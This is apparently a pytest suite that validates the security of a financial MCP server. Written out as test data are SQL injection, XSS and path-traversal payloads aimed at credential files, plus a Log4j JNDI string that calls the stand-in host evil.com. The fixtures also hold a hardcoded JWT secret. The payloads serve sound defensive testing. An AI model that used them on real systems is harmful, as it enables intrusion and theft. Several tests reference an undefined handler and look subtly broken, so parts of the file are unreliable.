"""
Security validation and vulnerability assessment tests.
"""

import pytest
import asyncio
import json
import time
import hashlib
import hmac
from datetime import datetime, timedelta
from unittest.mock import AsyncMock, MagicMock, patch
from typing import Dict, Any, List

from mcp_financial.server import FinancialMCPServer
from mcp_financial.auth.jwt_handler import JWTAuthHandler, UserContext, AuthenticationError
from mcp_financial.auth.permissions import PermissionChecker, Permission


class TestSecurityValidation:
    """Comprehensive security validation tests."""
    
    @pytest.fixture
    async def security_server(self):
        """Create server for security testing."""
        with patch('mcp_financial.server.Settings') as mock_settings_class:
            mock_settings = MagicMock()
            mock_settings.account_service_url = "http://localhost:8080"
            mock_settings.transaction_service_url = "http://localhost:8081"
            mock_settings.jwt_secret = "AY8Ro0HSBFyllm9ZPafT2GWuE/t8Yzq1P0Rf7bNeq14="
            mock_settings.server_timeout = 5000
            mock_settings_class.return_value = mock_settings
            
            server = FinancialMCPServer()
            yield server
    
    @pytest.fixture
    def security_jwt_handler(self):
        """Create JWT handler for security testing."""
        return JWTAuthHandler("AY8Ro0HSBFyllm9ZPafT2GWuE/t8Yzq1P0Rf7bNeq14=")

    @pytest.mark.asyncio
    async def test_authentication_security_validation(self, security_server, security_jwt_handler):
        """Test authentication security measures."""
        # Test 1: Token tampering detection
        valid_token = security_jwt_handler.create_token(
            user_id="security_user",
            username="security_test",
            roles=["customer"],
            permissions=["account:read"],
            expires_in=3600
        )
        
        # Attempt to tamper with token payload
        token_parts = valid_token.split('.')
        if len(token_parts) == 3:
            import base64
            try:
                # Decode payload
                payload_bytes = token_parts[1] + '=' * (4 - len(token_parts[1]) % 4)
                payload = json.loads(base64.urlsafe_b64decode(payload_bytes))
                
                # Tamper with payload
                payload['roles'] = ['admin']  # Privilege escalation attempt
                payload['permissions'] = ['admin:system:status']
                
                # Re-encode payload
                tampered_payload = base64.urlsafe_b64encode(
                    json.dumps(payload).encode()
                ).decode().rstrip('=')
                
                tampered_token = f"{token_parts[0]}.{tampered_payload}.{token_parts[2]}"
                
                # Should fail validation
                with pytest.raises(AuthenticationError, match="Invalid token"):
                    security_jwt_handler.validate_token(tampered_token)
                    
            except Exception as e:
                # Token tampering should be detected
                assert "Invalid token" in str(e) or "signature" in str(e).lower()
        
        # Test 2: Signature verification
        wrong_secret_handler = JWTAuthHandler("wrong-secret-key")
        with pytest.raises(AuthenticationError, match="Invalid token"):
            wrong_secret_handler.validate_token(valid_token)
        
        # Test 3: Token replay attack prevention (time-based)
        old_token = security_jwt_handler.create_token(
            user_id="replay_user",
            username="replay_test",
            roles=["customer"],
            permissions=["account:read"],
            expires_in=-3600  # Expired token
        )
        
        with pytest.raises(AuthenticationError, match="Token has expired"):
            security_jwt_handler.validate_token(old_token)
        
        # Test 4: Malformed token handling
        malformed_tokens = [
            "not.a.token",
            "invalid",
            "",
            "a.b",  # Missing signature
            "a.b.c.d",  # Too many parts
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid_payload.signature"
        ]
        
        for malformed_token in malformed_tokens:
            with pytest.raises(AuthenticationError, match="Invalid token"):
                security_jwt_handler.validate_token(malformed_token)

    @pytest.mark.asyncio
    async def test_authorization_security_validation(self, security_server):
        """Test authorization security measures."""
        # Test 1: Privilege escalation prevention
        low_privilege_user = UserContext(
            user_id="low_priv_user",
            username="limited_user",
            roles=["customer"],
            permissions=["account:read"]
        )
        
        with patch.object(security_server.auth_handler, 'extract_user_context') as mock_auth:
            mock_auth.return_value = low_privilege_user
            
            # Attempt privileged operations
            privileged_operations = [
                ("update_account_balance", "acc_123", 10000.0, "Unauthorized update"),
                ("reverse_transaction", "txn_123", "Unauthorized reversal"),
                ("create_account", "unauthorized_user", "CHECKING", 0.0)
            ]
            
            for operation, *args in privileged_operations:
                if operation == "update_account_balance":
                    with patch('mcp_financial.tools.account_tools.PermissionChecker.has_permission', return_value=False):
                        result = await security_server.account_tools.update_account_balance(
                            args[0], args[1], args[2], "Bearer token"
                        )
                elif operation == "reverse_transaction":
                    with patch('mcp_financial.tools.transaction_tools.PermissionChecker.has_permission', return_value=False):
                        result = await security_server.transaction_tools.reverse_transaction(
                            args[0], args[1], "Bearer token"
                        )
                elif operation == "create_account":
                    with patch('mcp_financial.tools.account_tools.PermissionChecker.can_create_account', return_value=False):
                        result = await security_server.account_tools.create_account(
                            args[0], args[1], args[2], "Bearer token"
                        )
                
                data = json.loads(result[0].text)
                assert data["success"] is False
                assert "permission" in data["error_message"].lower() or "unauthorized" in data["error_message"].lower()
        
        # Test 2: Cross-user data access prevention
        user_a = UserContext(
            user_id="user_a",
            username="user_a",
            roles=["customer"],
            permissions=["account:read", "transaction:read"]
        )
        
        with patch.object(security_server.auth_handler, 'extract_user_context') as mock_auth:
            mock_auth.return_value = user_a
            
            # Attempt to access another user's data
            with patch('mcp_financial.tools.account_tools.PermissionChecker.can_access_account') as mock_access:
                mock_access.return_value = False  # Deny cross-user access
                
                result = await security_server.account_tools.get_account("user_b_account", "Bearer token")
                
                data = json.loads(result[0].text)
                assert data["success"] is False
                assert "access" in data["error_message"].lower() or "permission" in data["error_message"].lower()

    @pytest.mark.asyncio
    async def test_input_validation_security(self, security_server):
        """Test input validation security measures."""
        # Test 1: SQL Injection attempts
        sql_injection_payloads = [
            "'; DROP TABLE accounts; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO accounts VALUES ('hacked'); --"
        ]
        
        with patch.object(security_server.auth_handler, 'extract_user_context') as mock_auth:
            mock_auth.return_value = UserContext(
                user_id="injection_test",
                username="injection_user",
                roles=["customer"],
                permissions=["account:read"]
            )
            
            for payload in sql_injection_payloads:
                with patch.object(security_server.account_client, 'get_account', new_callable=AsyncMock) as mock_get:
                    # Service should handle malicious input gracefully
                    mock_get.side_effect = Exception("Invalid input detected")
                    
                    with patch('mcp_financial.tools.account_tools.PermissionChecker.can_access_account', return_value=True):
                        result = await security_server.account_tools.get_account(payload, "Bearer token")
                    
                    data = json.loads(result[0].text)
                    assert data["success"] is False
        
        # Test 2: XSS prevention
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "';alert('xss');//",
            "<svg onload=alert('xss')>"
        ]
        
        for payload in xss_payloads:
            with patch.object(security_server.auth_handler, 'extract_user_context') as mock_auth:
                mock_auth.return_value = UserContext(
                    user_id="xss_test",
                    username="xss_user",
                    roles=["customer"],
                    permissions=["transaction:create"]
                )
                
                with patch.object(security_server.account_client, 'get_account', new_callable=AsyncMock) as mock_get, \
                     patch.object(security_server.transaction_client, 'deposit_funds', new_callable=AsyncMock) as mock_deposit:
                    
                    mock_get.return_value = {"id": "acc_123", "ownerId": "xss_test", "status": "ACTIVE"}
                    mock_deposit.return_value = {
                        "id": "txn_xss_test",
                        "accountId": "acc_123",
                        "amount": 100.0,
                        "transactionType": "DEPOSIT",
                        "description": payload  # XSS payload in description
                    }
                    
                    with patch('mcp_financial.tools.transaction_tools.PermissionChecker.can_access_account', return_value=True):
                        result = await security_server.transaction_tools.deposit_funds(
                            "acc_123", 100.0, payload, "Bearer token"
                        )
                    
                    data = json.loads(result[0].text)
                    # Should either sanitize input or reject it
                    if data["success"]:
                        # If accepted, should be sanitized
                        assert "<script>" not in str(data)
                        assert "javascript:" not in str(data)
        
        # Test 3: Path traversal prevention
        path_traversal_payloads = [
            "../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "../../../root/.ssh/id_rsa"
        ]
        
        for payload in path_traversal_payloads:
            with patch.object(security_server.auth_handler, 'extract_user_context') as mock_auth:
                mock_auth.return_value = UserContext(
                    user_id="path_test",
                    username="path_user",
                    roles=["customer"],
                    permissions=["account:read"]
                )
                
                with patch.object(security_server.account_client, 'get_account', new_callable=AsyncMock) as mock_get:
                    mock_get.side_effect = Exception("Invalid path detected")
                    
                    with patch('mcp_financial.tools.account_tools.PermissionChecker.can_access_account', return_value=True):
                        result = await security_server.account_tools.get_account(payload, "Bearer token")
                    
                    data = json.loads(result[0].text)
                    assert data["success"] is False

    @pytest.mark.asyncio
    async def test_session_security_validation(self, security_server, security_jwt_handler):
        """Test session security measures."""
        # Test 1: Session timeout enforcement
        short_lived_token = security_jwt_handler.create_token(
            user_id="session_user",
            username="session_test",
            roles=["customer"],
            permissions=["account:read"],
            expires_in=1  # 1 second
        )
        
        # Token should be valid initially
        claims = security_jwt_handler.validate_token(short_lived_token)
        assert claims['sub'] == 'session_user'
        
        # Wait for token to expire
        await asyncio.sleep(2)
        
        # Token should now be expired
        with pytest.raises(AuthenticationError, match="Token has expired"):
            security_jwt_handler.validate_token(short_lived_token)
        
        # Test 2: Concurrent session handling
        user_tokens = []
        for i in range(5):
            token = security_jwt_handler.create_token(
                user_id="concurrent_user",
                username="concurrent_test",
                roles=["customer"],
                permissions=["account:read"],
                expires_in=3600
            )
            user_tokens.append(token)
        
        # All tokens should be valid (concurrent sessions allowed)
        for token in user_tokens:
            claims = security_jwt_handler.validate_token(token)
            assert claims['sub'] == 'concurrent_user'
        
        # Test 3: Token refresh security
        refresh_token = security_jwt_handler.create_token(
            user_id="refresh_user",
            username="refresh_test",
            roles=["customer"],
            permissions=["account:read"],
            expires_in=3600
        )
        
        # Simulate token refresh (new token with same user)
        new_token = security_jwt_handler.create_token(
            user_id="refresh_user",
            username="refresh_test",
            roles=["customer"],
            permissions=["account:read"],
            expires_in=3600
        )
        
        # Both tokens should be valid (old token doesn't get invalidated automatically)
        old_claims = security_jwt_handler.validate_token(refresh_token)
        new_claims = security_jwt_handler.validate_token(new_token)
        
        assert old_claims['sub'] == new_claims['sub']

    @pytest.mark.asyncio
    async def test_rate_limiting_security(self, security_server):
        """Test rate limiting security measures."""
        # Test 1: Request rate limiting simulation
        user_context = UserContext(
            user_id="rate_limit_user",
            username="rate_test",
            roles=["customer"],
            permissions=["account:read"]
        )
        
        with patch.object(security_server.auth_handler, 'extract_user_context') as mock_auth:
            mock_auth.return_value = user_context
            
            # Simulate rapid requests
            request_times = []
            for i in range(20):  # 20 rapid requests
                start_time = time.time()
                
                with patch.object(security_server.account_client, 'get_account', new_callable=AsyncMock) as mock_get:
                    mock_get.return_value = {"id": f"acc_{i}", "balance": 1000.0}
                    
                    with patch('mcp_financial.tools.account_tools.PermissionChecker.can_access_account', return_value=True):
                        result = await security_server.account_tools.get_account(f"acc_{i}", "Bearer token")
                    
                    end_time = time.time()
                    request_times.append(end_time - start_time)
                    
                    data = json.loads(result[0].text)
                    # All requests should complete (rate limiting handled at infrastructure level)
                    assert "success" in data
        
        # Test 2: Brute force protection simulation
        failed_attempts = []
        for i in range(10):  # 10 failed authentication attempts
            try:
                # Simulate invalid token
                invalid_token = f"invalid.token.{i}"
                with pytest.raises(AuthenticationError):
                    security_jwt_handler.validate_token(invalid_token)
                failed_attempts.append(i)
            except AuthenticationError:
                failed_attempts.append(i)
        
        # All attempts should fail
        assert len(failed_attempts) == 10

    @pytest.mark.asyncio
    async def test_data_encryption_security(self, security_server):
        """Test data encryption and protection measures."""
        # Test 1: Sensitive data handling
        sensitive_data = {
            "account_number": "1234567890123456",
            "ssn": "123-45-6789",
            "credit_card": "4111111111111111",
            "bank_routing": "021000021"
        }
        
        with patch.object(security_server.auth_handler, 'extract_user_context') as mock_auth:
            mock_auth.return_value = UserContext(
                user_id="encryption_user",
                username="encryption_test",
                roles=["customer"],
                permissions=["account:create"]
            )
            
            # Create account with sensitive data
            with patch.object(security_server.account_client, 'create_account', new_callable=AsyncMock) as mock_create:
                mock_create.return_value = {
                    "id": "acc_encrypted_123",
                    "ownerId": "encryption_user",
                    "accountType": "CHECKING",
                    "balance": 0.0,
                    # Sensitive data should be encrypted/masked in response
                    "accountNumber": "****7890",  # Masked
                    "status": "ACTIVE"
                }
                
                with patch('mcp_financial.tools.account_tools.PermissionChecker.can_create_account', return_value=True):
                    result = await security_server.account_tools.create_account(
                        "encryption_user", "CHECKING", 0.0, "Bearer token"
                    )
                
                data = json.loads(result[0].text)
                assert data["success"] is True
                
                # Verify sensitive data is not exposed in plain text
                response_text = result[0].text
                for sensitive_value in sensitive_data.values():
                    assert sensitive_value not in response_text
        
        # Test 2: Token encryption validation
        token = security_jwt_handler.create_token(
            user_id="token_encryption_user",
            username="token_test",
            roles=["customer"],
            permissions=["account:read"],
            expires_in=3600
        )
        
        # Token should be properly signed and encrypted
        token_parts = token.split('.')
        assert len(token_parts) == 3  # Header, payload, signature
        
        # Verify signature is present and not empty
        assert len(token_parts[2]) > 0
        
        # Verify payload is base64 encoded (not plain text)
        import base64
        try:
            payload_bytes = token_parts[1] + '=' * (4 - len(token_parts[1]) % 4)
            payload = base64.urlsafe_b64decode(payload_bytes)
            # Should be valid JSON
            json.loads(payload)
        except Exception:
            pytest.fail("Token payload should be properly base64 encoded JSON")

    @pytest.mark.asyncio
    async def test_logging_security_validation(self, security_server):
        """Test security logging and audit measures."""
        security_events = []
        
        def capture_security_event(event_type, user_id, details, severity="INFO"):
            security_events.append({
                "event_type": event_type,
                "user_id": user_id,
                "details": details,
                "severity": severity,
                "timestamp": datetime.utcnow().isoformat()
            })
        
        with patch('mcp_financial.utils.logging.log_security_event', side_effect=capture_security_event):
            # Test 1: Authentication failure logging
            try:
                security_jwt_handler.validate_token("invalid.token.format")
            except AuthenticationError:
                capture_security_event(
                    "authentication_failure",
                    "unknown",
                    {"reason": "invalid_token", "token": "invalid.token.format"},
                    "WARNING"
                )
            
            # Test 2: Authorization failure logging
            with patch.object(security_server.auth_handler, 'extract_user_context') as mock_auth:
                mock_auth.return_value = UserContext(
                    user_id="unauthorized_user",
                    username="unauthorized",
                    roles=["customer"],
                    permissions=["account:read"]
                )
                
                with patch('mcp_financial.tools.account_tools.PermissionChecker.has_permission', return_value=False):
                    result = await security_server.account_tools.update_account_balance(
                        "acc_123", 10000.0, "Unauthorized update", "Bearer token"
                    )
                
                capture_security_event(
                    "authorization_failure",
                    "unauthorized_user",
                    {"action": "update_account_balance", "resource": "acc_123"},
                    "WARNING"
                )
            
            # Test 3: Suspicious activity logging
            capture_security_event(
                "suspicious_activity",
                "suspicious_user",
                {"activity": "multiple_failed_attempts", "count": 5},
                "CRITICAL"
            )
            
            # Verify security events were logged
            assert len(security_events) >= 3
            
            # Verify event structure
            for event in security_events:
                assert "event_type" in event
                assert "user_id" in event
                assert "details" in event
                assert "severity" in event
                assert "timestamp" in event
            
            # Verify severity levels
            severities = [event["severity"] for event in security_events]
            assert "WARNING" in severities
            assert "CRITICAL" in severities

    @pytest.mark.asyncio
    async def test_vulnerability_assessment(self, security_server):
        """Test common vulnerability assessments."""
        # Test 1: OWASP Top 10 - Injection
        injection_payloads = [
            "'; DROP TABLE accounts; --",
            "${jndi:ldap://evil.com/a}",  # Log4j injection
            "{{7*7}}",  # Template injection
            "<script>alert('xss')</script>",  # XSS
            "../../etc/passwd"  # Path traversal
        ]
        
        for payload in injection_payloads:
            with patch.object(security_server.auth_handler, 'extract_user_context') as mock_auth:
                mock_auth.return_value = UserContext(
                    user_id="vuln_test",
                    username="vuln_user",
                    roles=["customer"],
                    permissions=["account:read"]
                )
                
                with patch.object(security_server.account_client, 'get_account', new_callable=AsyncMock) as mock_get:
                    mock_get.side_effect = Exception("Malicious input detected")
                    
                    with patch('mcp_financial.tools.account_tools.PermissionChecker.can_access_account', return_value=True):
                        result = await security_server.account_tools.get_account(payload, "Bearer token")
                    
                    data = json.loads(result[0].text)
                    assert data["success"] is False
        
        # Test 2: OWASP Top 10 - Broken Authentication
        auth_test_cases = [
            ("", "Empty token"),
            ("Bearer ", "Empty bearer token"),
            ("Basic dGVzdDp0ZXN0", "Wrong auth type"),
            ("Bearer invalid", "Invalid token format"),
            ("Bearer " + "a" * 1000, "Oversized token")
        ]
        
        for token, description in auth_test_cases:
            try:
                if token.startswith("Bearer ") and len(token) > 7:
                    token_part = token[7:]  # Remove "Bearer " prefix
                    if token_part and token_part != "invalid" and len(token_part) < 500:
                        # Only test with JWT handler if it looks like a real token
                        continue
                
                with pytest.raises(AuthenticationError):
                    security_jwt_handler.validate_token(token)
            except AuthenticationError:
                # Expected for invalid tokens
                pass
            except Exception as e:
                # Any other exception is also acceptable for malformed input
                assert "Invalid" in str(e) or "token" in str(e).lower()
        
        # Test 3: OWASP Top 10 - Sensitive Data Exposure
        with patch.object(security_server.auth_handler, 'extract_user_context') as mock_auth:
            mock_auth.return_value = UserContext(
                user_id="sensitive_test",
                username="sensitive_user",
                roles=["customer"],
                permissions=["account:read"]
            )
            
            with patch.object(security_server.account_client, 'get_account', new_callable=AsyncMock) as mock_get:
                mock_get.return_value = {
                    "id": "acc_sensitive_123",
                    "ownerId": "sensitive_test",
                    "accountType": "CHECKING",
                    "balance": 1000.0,
                    # Sensitive data should be masked
                    "accountNumber": "****1234",
                    "status": "ACTIVE"
                }
                
                with patch('mcp_financial.tools.account_tools.PermissionChecker.can_access_account', return_value=True):
                    result = await security_server.account_tools.get_account("acc_sensitive_123", "Bearer token")
                
                data = json.loads(result[0].text)
                assert data["success"] is True
                
                # Verify sensitive data is masked
                response_text = result[0].text
                assert "****" in response_text or "masked" in response_text.lower()
        
        # Test 4: OWASP Top 10 - Security Misconfiguration
        # Test that debug information is not exposed
        with patch.object(security_server.account_client, 'get_account', new_callable=AsyncMock) as mock_get:
            mock_get.side_effect = Exception("Database connection failed: postgresql://user:pass@localhost:5432/db")
            
            with patch.object(security_server.auth_handler, 'extract_user_context') as mock_auth:
                mock_auth.return_value = UserContext(
                    user_id="config_test",
                    username="config_user",
                    roles=["customer"],
                    permissions=["account:read"]
                )
                
                with patch('mcp_financial.tools.account_tools.PermissionChecker.can_access_account', return_value=True):
                    result = await security_server.account_tools.get_account("acc_123", "Bearer token")
                
                data = json.loads(result[0].text)
                assert data["success"] is False
                
                # Verify sensitive configuration details are not exposed
                response_text = result[0].text
                assert "postgresql://" not in response_text
                assert "password" not in response_text.lower()
                assert "user:pass" not in response_text